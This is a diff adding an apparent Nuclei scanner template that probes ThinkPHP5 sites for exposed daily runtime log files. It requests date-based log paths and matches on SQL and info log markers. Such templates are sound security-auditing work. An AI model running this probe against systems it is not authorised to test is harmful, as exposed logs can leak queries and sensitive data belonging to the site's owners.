@@ -1,0 +1,61 @@
+id: poc-local-thinkphp-v5-logfile-leak
+
+info:
+  name: thinkphp5日志文件泄露
+  author: capiton
+  severity: medium
+  description: ""
+  reference: ""
+  tags: thinkphp
+
+variables:
+  year: '{{date_time("%Y")}}'
+  month: '{{date_time("%M")}}'
+  today: '{{date_time("%D")}}'
+  yesterday: '{{to_number(today) - 1 }}'
+
+requests:
+  - raw:
+      - |+
+        GET /{{dir}}{{year}}{{month}}/{{today}}{{logfile}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /{{dir}}{{year}}{{month}}/{{yesterday}}{{logfile}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /{{dir}}{{year}}{{month}}/0{{today}}{{logfile}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /{{dir}}{{year}}{{month}}/0{{yesterday}}{{logfile}} HTTP/1.1
+        Host: {{Hostname}}
+
+
+
+    payloads:
+      dir:
+        - runtime/log/
+      
+      logfile:
+        - .log
+        - _cli.log
+
+    attack: clusterbomb
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: or
+        words:
+          - "INFO:"
+          - "SQL:"
+          - "NOTIC:"
+          - "[ info ]"
+          - "[ sql ]"
